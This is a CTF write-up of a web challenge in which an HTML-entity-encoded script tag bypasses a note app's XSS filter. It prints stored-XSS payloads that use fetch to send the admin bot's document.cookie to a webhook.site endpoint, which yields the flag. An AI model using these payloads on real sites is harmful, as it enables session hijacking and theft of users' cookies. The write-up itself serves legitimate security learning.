# Description

All my friends warned me about xss, so I created this note taking app that only accepts "refined" Notes.

# Solution

The challenge does not come with any files .. howerver we get 2 links: one for creating new notes and another to check
already created notes.

<img width="277" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/b2698df4-b442-4eaa-b94d-edf3903ad277">

<img width="376" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/dac61abd-a09e-45f7-b052-bc679af0f1d1">

Let's try and create a note

<img width="267" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/15a2a175-f5bb-4c68-be08-5bbc04fc82fe">

<img width="479" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/a87cf163-434f-487b-bce6-933f884a8193">

We can access it from the adminbot page using the generated UID

<img width="131" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/2d1650dd-09d5-4781-9fa7-49ff2104c5e5">

Let's try to put some javascript code into the note

<img width="281" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/d9cef8b4-079c-4493-b560-07295ba15077">

It looks like the website looks for any source code and removes it

<img width="266" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/f903cf42-cdb3-463c-b305-620c1666a8be">

Let's try to encode the source code in HTML to see how the page reacts

<img width="267" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/33a080a3-675f-4d4f-883e-d4d12d128f4a">

It looks like it decoded it and saved it 

<img width="265" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/a19aa1cb-f00b-4b21-9202-07b50cae14b3">

Okay so let's create a simple payload which contacts our webhook and access the note with adminbot to see if it works
```
original = <script>fetch("https://webhook.site/87a78774-1478-4f7c-9f67-1baa96bde1cc?data=test")</script>
encoded = &lt;script&gt;fetch(&quot;https://webhook.site/87a78774-1478-4f7c-9f67-1baa96bde1cc?data=test&quot;)&lt;/script&gt;
```

And we got a hit

<img width="390" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/c92587b6-2d3e-43c0-8552-7ace82b18f38">

Okay so now lets try to send the cookies the pages in admin use to see if it contains the flag
```
original = <script>fetch("https://webhook.site/87a78774-1478-4f7c-9f67-1baa96bde1cc?data=" + document.cookie)</script>
encoded = &lt;script&gt;fetch(&quot;https://webhook.site/87a78774-1478-4f7c-9f67-1baa96bde1cc?data=&quot; + document.cookie)&lt;/script&gt;
```
and we get the flag: `flag=GPNCTF{3nc0d1ng_1s_th3_r00t_0f_4ll_3v1l}`
